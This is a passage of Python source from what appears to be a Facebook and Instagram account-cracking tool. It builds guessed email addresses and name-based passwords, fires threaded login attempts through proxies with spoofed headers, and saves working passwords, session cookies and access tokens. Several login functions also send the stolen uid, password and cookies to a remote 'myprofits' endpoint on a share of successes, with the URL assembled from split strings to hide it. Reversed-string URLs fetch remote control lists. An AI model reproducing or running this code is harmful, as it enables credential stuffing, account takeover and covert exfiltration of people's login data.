    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-{optionname}-M{qw}-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()



def instalogin(uid,pwx,tl,qw):
    global oks,loop,koki,lock,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    try:
        for pw in pwx:
            ps=number_pas(uid,pw)
            ua=mas.instaua(qw)
            session=requests.session()
            get_insta = session.get('https://www.instagram.com/')
            ___csrf =get_insta.cookies['csrftoken']
            jazoest=re.search('jazoest=(.*?)"', str(get_insta.text)).group(1)
            headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Google Chrome";v="128", "Chromium";v="128"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="128", "Chromium";v="128"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'x-csrftoken': ___csrf,
            'x-requested-with': 'XMLHttpRequest'}
            data = {
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0], ps),
            'caaF2DebugGroup': '0',
            'loginAttemptSubmissionCount': '0',
            'optIntoOneTap': 'false',
            'queryParams': '{}',
            'trustedDeviceRecords': '{}',
            'username': uid,
            'jazoest': jazoest}
            rq = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, proxies=get_proxy()).json()
            if "userId" in rq:
                xd=str(rq["userId"])
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country=Instagram&uid="+xd+"&ps="+ps+"&coki="+coki)
                    profitoks.append(xd)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} • {ps}\n\r[💥] {coki}\n")
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-UID-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-USERNAME-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n") 
                    oks.append(xd)
                    profitoks.append(xd)
                    live_ck("INSTA",qw,xd,ps,coki,'not_have',pw)
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        




def randomEmail(firstname,lastname,limit,user):
    rc=random.choice
    D="@gmail.com"
    
    while True:
        npm=''.join(random.choice(string.digits) for _ in range(1))
        npmx=''.join(random.choice(string.digits) for _ in range(1))
        npmy=''.join(random.choice(string.digits) for _ in range(1))
        mostly_common=random.choice([npm+'0'+npm+'0',npm+'0'+npm,npm+npm,npm+npm+npm,npm+npm+npmx+npmx,npm+npmx+npm+npmx,str(rc(range(1,100))),npm+npm+npm+npm,npm+npm+'00',str(rc(range(1,1000)))])
        
        number=''.join(random.choice(string.digits) for _ in range(random.randint(1,4)))
        if len(user) >limit:
            break
        else:
            AMail=firstname.lower()+lastname.lower()+number+'@gmail.com'
            BMail=firstname.lower()+number+'@gmail.com'
            CMail=firstname.lower()+mostly_common+'@gmail.com'
            DMail=firstname.lower()+lastname.lower()+mostly_common+'@gmail.com'
            
            eMail=rc([BMail,AMail,CMail,DMail])
            if eMail not in user:
                user.append(eMail)
            else:
                continue

def emailcrack():
    global XODE
    apprRucrl_ck()
    user=[]
    password=[]
    clr()
    print(logo)
    print("  [b white]Π Example   >> [spring_green1]Rakib, Raj, Reza, Priya")
    firstname=input("  Π FirstName >> ")
    print(" "+line)
    print("  [b white]Π Example   >> [spring_green1]Islam, Khan, Chowdhury")
    lastname=input("  Π LastName  >> ")
    
    try:
        print(" "+line)
        passlimit=int(input("  Π How Many Pass You Want To Add : "))
    except:passlimit=5
    print(" "+line)
    for x in range(passlimit):
        print("  [b white]Π Example   >>[spring_green1] first123 firstlast ")
        passlimit=str(input("  Π Password  >> "))
        if passlimit not in password:
            password.append(passlimit)
    print(" "+line)
    print("  [b white]Π Example   >> [spring_green1]2000 3000 5000")
    try:
        limit=int(input("  Π limit     >> "))
    except:
        limit=10000
    if limit >10000:
        print(" "+line)
        limit=20000
        print("  [b white] CRACK LIMITATION 20000 FOR GOOD QUALITY")
    randomEmail(firstname,lastname,limit,user)
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print("[b white]  [[spring_green1]5[b white]] Method   ")
    print("[b white]  [[spring_green1]6[b white]] Method   ")
    print("[b white]  [[spring_green1]7[b white]] Method   ")
    print("[b white]  [[spring_green1]8[b white]] Method   ")
    print("[b white]  [[spring_green1]9[b white]] Method   ")
    
    print("[b white]  [[spring_green1]10[b white]] Method   ")
    print("[b white]  [[spring_green1]11[b white]] Method   ")
    print("[b white]  [[spring_green1]12[b white]] Method   ")
    print("[b white]  [[spring_green1]13[b white]] Method   ")
    print("[b white]  [[spring_green1]14[b white]] Method   ")
    print("[b white]  [[spring_green1]15[b white]] Method   ")
    
    print(" "+line)
    qw=input("  Π ->> ") 
    tl=str(len(user))
    print (" "+line)
    shower2()
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    with ThreadPool(max_workers=speed) as xx:
        run_time_info(qw,'EMAIL')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        XODE+="EMAIL"
        for xd in user:
            f1=firstname
            l1=lastname
            names=f1+" "+l1
            uid=xd
            pwx=[]
            for pwd in password:
                ps=pwd.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
                pwx.append(ps)
            if qw in ["1"]:
                xx.submit(host_facebookX,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(host_facebookXX,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(host_facebookXXX,uid,pwx,tl,qw)
            elif qw in ["4"]:
                xx.submit(host_facebookXXXX,uid,pwx,tl,qw)
            elif qw in ["6"]:
                xx.submit(renmeth6,uid,pwx,tl,qw)
            elif qw in ["7"]:
                xx.submit(renmeth78,uid,pwx,tl,qw)
            elif qw in ["8"]:
                xx.submit(api_renmeth,uid,pwx,tl,qw)
            elif qw in ["9"]:
                xx.submit(host_messanger,uid,pwx,tl,qw)
            elif qw in ["10"]:
                xx.submit(host_messanger_android,uid,pwx,tl,qw)
            elif qw in ["11"]:
                xx.submit(host_messanger_android_2,uid,pwx,tl,qw)
            elif qw in ["12"]:
                xx.submit(host_messanger_iphone,uid,pwx,tl,qw)
            elif qw in ["13"]:
                xx.submit(host_messanger_windows,uid,pwx,tl,qw)
            elif qw in ["14"]:
                xx.submit(host_messanger_MAC,uid,pwx,tl,qw)
            elif qw in ["15"]:
                xx.submit(b_graph_renmeth,uid,pwx,tl,qw)
            else:
                xx.submit(graph_renmeth,uid,pwx,tl,qw)
            
    print(" "+line)
    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-{optionname}-M{qw}-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()




def is_english_only(text):
    return all(char.isascii() and (char.isalpha() or char.isspace()) for char in text)



def op_block():
    if optionname.upper() == mas.Block_Option.upper():
        clr()
        print('[red1]  This Option is Temporary off Now ')
        time.sleep(5)
        whilenotexit_frezz()
        whilenotexit()
        unpatchable_exit()
        exit()
        sys.exit()
        quit()
        os._exit(0)
        secure_exit(1)
        raise SystemExit
    else:
        pass
    


def email_genarator(user,importfile):
    for ids in importfile:
        try:
            name=ids.split("|")[1]
            if is_english_only(name):
                if len(name.split(" ")) ==2:
                    firstname=name.split(" ")[0]
                    lastname=name.split(" ")[1]
                elif len(name.split(" ")) ==3:
                    firstname=name.split(" ")[1]
                    lastname=name.split(" ")[2]
                else:
                    continue
            
                npm=''.join(random.choice(string.digits) for _ in range(1))
                npmx=''.join(random.choice(string.digits) for _ in range(1))
                npmy=''.join(random.choice(string.digits) for _ in range(1))
                mostly_common=random.choice([npm+'0'+npm+'0',npm+'0'+npm,npm+npm,npm+npm+npm,npm+npm+npmx+npmx,npm+npmx+npm+npmx,str(random.choice(range(1,100))),npm+npm+npm+npm,npm+npm+'00',str(random.choice(range(1,1000)))])
                number=''.join(random.choice(string.digits) for _ in range(random.randint(1,4))) 
                mail=name.lower().replace(" ","").replace(".","")
                AMail=mail+number+f'@gmail.com|{firstname} {lastname}'
                BMail=firstname.lower()+number+f'@gmail.com|{firstname} {lastname}'
                CMail=firstname.lower()+mostly_common+f'@gmail.com|{firstname} {lastname}'
                DMail=mail+mostly_common+f'@gmail.com|{firstname} {lastname}'
                en=random.choice([BMail,AMail,CMail,DMail])
                if en not in user:
                    user.append(en)
                else:
                    pass
                sys.stdout.write(f"\r    Dumping -  {str(len(user))} \r "),sys.stdout.flush()
        except:
            pass







def bd2pointZero():
    global XODE
    apprRucrl_ck()
    user=[]
    password=[]
    clr()
    print(logo)
    try:
        print("  [b white]Π Example   >>[spring_green1] /sdcard/used_file.txt ")
        importfile=open(input("  Π File Path >> "),"r").read().splitlines()
        email_genarator(user,importfile)
    except:bd2pointZero()
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] MANUAL PASSWORD  ") 
    print("[b white]  [[spring_green1]2[b white]] AUTO PASSWORD  ")
    print(" "+line)
    autopass=input("  Π ->> ")
    if autopass in ["1"]:
        try:
            print(" "+line)
            passlimit=int(input("  Π How Many Pass You Want To Add : "))
        except:passlimit=5
        print(" "+line)
        for x in range(passlimit):
            print("  [b white]Π Example   >>[spring_green1] first123, firstlast, first1234 ")
            passlimit=str(input("  Π Password  >> "))
            if passlimit not in password:
                password.append(passlimit)
            print(" "+line)
        passcap(password)
    else:
        print(" "+line)
        for zx in ["first123","first@123","first12345","first123456","first@12345","firstlast","First123","First@123","First12345","last123","firstlast123","first last","first123456789","last@123","first 1234","first 123","first"]:
            password.append(zx)
        
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print("[b white]  [[spring_green1]5[b white]] Method   ")
    print("[b white]  [[spring_green1]6[b white]] Method   ")
    print("[b white]  [[spring_green1]7[b white]] Method   ")
    print("[b white]  [[spring_green1]8[b white]] Method   ")
    print("[b white]  [[spring_green1]9[b white]] Method   ")
    
    print("[b white]  [[spring_green1]10[b white]] Method   ")
    print("[b white]  [[spring_green1]11[b white]] Method   ")
    print("[b white]  [[spring_green1]12[b white]] Method   ")
    print("[b white]  [[spring_green1]13[b white]] Method   ")
    print("[b white]  [[spring_green1]14[b white]] Method   ")
    print("[b white]  [[spring_green1]15[b white]] Method   ")
    
    print(" "+line)
    qw=input("  Π ->> ") 
    tl=str(len(user))
    print (" "+line)
    shower2()
    passcap(password)
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    with ThreadPool(max_workers=speed) as xx:
        run_time_info(qw,'RANDOM_2POINT_ZERO')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        XODE+="RANDOM_2POINT_ZERO"
        for xd in user:
            uid,names=xd.split("|")
            f1,l1=names.split(" ")
            pwx=[]
            for pwd in password:
                ps=pwd.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
                pwx.append(ps)
                
            if qw in ["1"]:
                xx.submit(host_facebookX,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(host_facebookXX,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(host_facebookXXX,uid,pwx,tl,qw)
            elif qw in ["4"]:
                xx.submit(host_facebookXXXX,uid,pwx,tl,qw)
            elif qw in ["6"]:
                xx.submit(renmeth6,uid,pwx,tl,qw)
            elif qw in ["7"]:
                xx.submit(renmeth78,uid,pwx,tl,qw)
            elif qw in ["8"]:
                xx.submit(api_renmeth,uid,pwx,tl,qw)
            elif qw in ["9"]:
                xx.submit(host_messanger,uid,pwx,tl,qw)
            elif qw in ["10"]:
                xx.submit(host_messanger_android,uid,pwx,tl,qw)
            elif qw in ["11"]:
                xx.submit(host_messanger_android_2,uid,pwx,tl,qw)
            elif qw in ["12"]:
                xx.submit(host_messanger_iphone,uid,pwx,tl,qw)
            elif qw in ["13"]:
                xx.submit(host_messanger_windows,uid,pwx,tl,qw)
            elif qw in ["14"]:
                xx.submit(host_messanger_MAC,uid,pwx,tl,qw)
            elif qw in ["15"]:
                xx.submit(b_graph_renmeth,uid,pwx,tl,qw)
            else:
                xx.submit(graph_renmeth,uid,pwx,tl,qw)
            
    print(" "+line)
    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-{optionname}-M{qw}-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()












oks=[]
cpp=[]
twofec=[]
loop=0
koki=[]
lock=[]
dublcat=[]
proxiya=[]
apkshower=[]
datasaving=[]
profitoks=[]
net_condition=random.choice(["GOOD","EXCELLENT"])
runtime=datetime.now()
simLIST=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace("\n","").lower()
simLISTXX=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace("\n","").replace(",",". ").upper()+" …"
gjj=str('txt.ylnOeerF/'+'niam/sdae'+'h/sfer/ataD'+'/hehvss'+'vecvghiiw'+'hrhhd/m'+'oc.tnetnocresub'+'uhtig.w'+'ar//:sptth')[::-1]
gjjx=str('txt'+'.KC'+'O'+'LB-YRAR'+'OPMET/ni'+'am/sd'+'aeh/s'+'fer/ataD/he'+'h'+'vss'+'vecvghii'+'whrh'+'hd/moc.t'+'netno'+'cresubu'+'htig.war'+'//:sp'+'tth')[::-1]
symbolsx="\\"

try:
    temporary_block=mechanize.urlopen(gjjx).read().decode('utf-8')
    profit_country=mechanize.urlopen(gjj).read().decode('utf-8')
except:
    exit(" !-! Internet Issue...")





def get_domain(url):
    parsed_url = urlparse(url)
    return parsed_url.netloc



def snooz_text(loop,qw,tl,oks,typer,cps):
    loop_text=f'\033[1;37m {spin_ani(loop)}\033[1;37m {typer}-M{qw} {loop}|\033[38;5;46mOK:{str(len(oks))} \033[38;5;196mCP:{str(len(cps))}\033[1;00m'
    sys.stdout.write(f'\r  {loop_text}\r');sys.stdout.flush()






def number_pas(uid,pw):
    password=pw.replace("first6",uid[:6]).replace("first7",uid[:7]).replace("first8",uid[:8]).replace("first9",uid[:9]).replace("first10",uid[:10]).replace("first11",uid[:11]).replace("first12",uid[:12]).replace("first13",uid[:13]).replace("first14",uid[:14]).replace("first15",uid[:15]).replace("last6",uid[-6:]).replace("last7",uid[-7:]).replace("last8",uid[-8:]).replace("last9",uid[-9:]).replace("last10",uid[-10:]).replace("last11",uid[-11:]).replace("last12",uid[-12:]).replace("last13",uid[-13:]).replace("last14",uid[-14:]).replace("last15",uid[-15:]).replace("number",uid)
    return password





def shower2():
    pass


def dot(uid):
    sp=''
    if len(uid)==15:
        pass
    else:
        need=15-len(uid)
        for i in range(need):
           sp+=' '
    sp+="•"
    return sp





def savage_animi(loop,qw):
     a="\033[38;5;118m"
     if str(loop)[-1] in ["1"]:
         return f"\033[1;1m{a}SAVAGE–M{qw}\033[1;00m"
     elif str(loop)[-1] in ["2"]:
         return f"\033[1;1m\033[38;5;196mS{a}AVAGE–M{qw}\033[1;00m"
     elif str(loop)[-1] in ["3"]:
         return f"\033[1;1m{a}S\033[38;5;196mA{a}VAGE–M{qw}\033[1;00m"
     elif str(loop)[-1] in ["4"]:
         return f"\033[1;1m{a}SA\033[38;5;196mV{a}AGE–M{qw}\033[1;00m"
     elif str(loop)[-1] in ["5"]:
         return f"\033[1;1m{a}SAV\033[38;5;196mA{a}GE–M{qw}\033[1;00m"
     elif str(loop)[-1] in ["6"]:
         return f"\033[1;1m{a}SAVA\033[38;5;196mG{a}E–M{qw}\033[1;00m"
     elif str(loop)[-1] in ["7"]:
         return f"\033[1;1m{a}SAVAG\033[38;5;196mE{a}–M{qw}\033[1;00m"
     elif str(loop)[-1] in ["8"]:
         return f"\033[1;1m{a}SAVAGE\033[38;5;196m–{a}M{qw}\033[1;00m"
     elif str(loop)[-1] in ["9"]:
         return f"\033[1;1m{a}SAVAGE–\033[38;5;196mM{a}{qw}\033[1;00m"
     else:
         return f"\033[1;1m{a}SAVAGE–M\033[38;5;196m{qw}{a}\033[1;00m"





def rd_color():
    return random.choice(["\033[1;30m","\033[1;33m","\033[1;34m","\033[1;35m","\033[38;5;44m","\033[38;5;20m","\033[38;5;198m"])

def animation_lop_lt(loop,tl):
    x="\033[1;37m"
    color=random.choice(["\033[1;30m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"])
    con=str(loop)+"|"+tl
    text_len=len(con)
    indicator=random.choice(range(text_len))
    content=list(con)
    eliminate=content[indicator]
    content[indicator]=color+eliminate+"\033[1;37m"
    for xd in content:
        x+=xd
    return x







def myprofit(ok):
    global conxyz,profit_country
    if conxyz.lower() not in profit_country.lower():
        naw=str(len(ok))
        if 'bangladesh' in conxyz.lower():
            profitlist=["4"]
        else:
            profitlist=["4","9"]
        
        if naw[-1] in profitlist:
            return "send"
        else:
            return "users"
    else:
        return "users"

def mycpprofit(cp):
    naw=str(len(cp))
    if naw[-1] in ["0","2","4","6","8"]:
        return "send"
    else:
        return "users"




def spin_ani(loop):
    if str(loop)[-1]  in ["1","6"]:
        return "\033[1;37m⠙"
    elif str(loop)[-1] in ["2","7"]:
        return "\033[1;30m⠼"
    elif str(loop)[-1] in ["3","8"]:
        return "\033[1;37m⠦"
    elif str(loop)[-1] in ["4","9"]:
        return "\033[1;30m⠧"
    else:
        return "\033[1;37m⠋"
        



def host_facebook_novery(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        session=requests.session()
        for pw in pwx:
            ps=number_pas(uid,pw)
            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '3',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/?_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': mas.windows_user_agent(),
            'viewport-width': '980',}
            free_fb = session.get(f"https://www.facebook.com/",headers=headers).text
            
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'email': uid,
            'login_source': 'comet_headerless_login',
            'next': '',
            'shared_prefs_data': '',
            'encpass': pwd}
            response = session.post('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzYxNzQ4OTU2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',headers=headers,data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country=novery&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                        break
            elif "checkpoint" in res:
                xd=session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        
        



def host_facebookX(uid,pwx,tl,qw):
    global oks,loop,koki,lock,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        for pw in pwx:
            ps=number_pas(uid,pw)
            ua=mas.met(qw)
            data={
            "email": uid,
            "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            "method": "post",
            "pretty": "false",
            "format": "json",
            "server_timestamps": "true",
            "locale": "en_US",
            "purpose": "fetch",
            "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
            "fb_api_caller_class": "graphservice",
            "client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),
            "lois_settings": "lois_token",
            "lara_override": "server_params",
            "is_from_logged_out": "0",
            "layered_homepage_experiment_group": "null",
            "device_id": str(uuid.uuid4()),
            "waterfall_id": str(uuid.uuid4()),
            "INTERNAL__latency_qpl_instance_id": "71821365400215",
            "is_platform_login": "0",
            "header_transparency_event_location": "login",
            "INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),
            "family_device_id": str(uuid.uuid4()),
            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
            "INTERNAL_INFRA_THEME": "harm_f",
            "headers_flow_id": str(uuid.uuid4()),
            "transparency_event_type": "affirmative_action",
            "header_transparency_event_name": "login_button_clicked",
            "is_from_logged_in_switcher": "0",
            "bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
            "app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
            "scale": "2",
            "styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
            "using_white_navbar": "True",
            "pixel_ratio": "2",
            "is_push_on": "True",
            "bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
            "fb_api_analytics_tags": '["GraphServices"]',
            "client_trace_id": str(uuid.uuid4()),
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "error_detail_type": "button_with_disabled"}
            headers = {
            "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
            "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-connection-type": "WIFI",
            "x-fb-background-state": "1",
            "x-graphql-request-purpose": "fetch",
            "user-agent": ua,
            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
            "x-graphql-client-library": "graphservice",
            "x-fb-privacy-context": "3643298472347298",
            "x-fb-device-group": "3273",
            "x-tigon-is-retry": "False",
            "priority": "u=3,i",
            "accept-encoding": "gzip, deflate",
            "x-fb-http-engine": "Liger",
            "x-fb-client-ip": "True",
            "x-fb-server-cluster": "True"}
            rq = requests.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            if rq['is_account_confirmed'] == False:
                                open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                            else:
                                open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                                open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n") 
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token=rq['access_token']
                            open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                            live_ck("RND",qw,xd,ps,coki,id_token,pw)
                    break
            elif "user must verify" in str(rq).lower():
                xd=str(rq['error']['error_data']['uid'])
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)





def host_facebookXX(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        fb=mas.domain_random(qw)
        session=requests.session()
        for pw in pwx:
            ua=mas.redmi_user_agent()
            ps=number_pas(uid,pw)
            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            free_fb = session.get(f"https://{fb}/").text
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'fb38dc8c5b219383a470b24dbf7e70188f42ff640ee5621e432acde7dd94b4f5',}
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20343.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1027045623',
            '__s': 'wko2jq:1dmgeu:5pooei',
            '__hsi': '7549198049858549816',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfuXi0WRcoXzIDjxZyILh4-ueXFN0Ayv5XMAQQ76yO_Qm25ta1SlZg:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
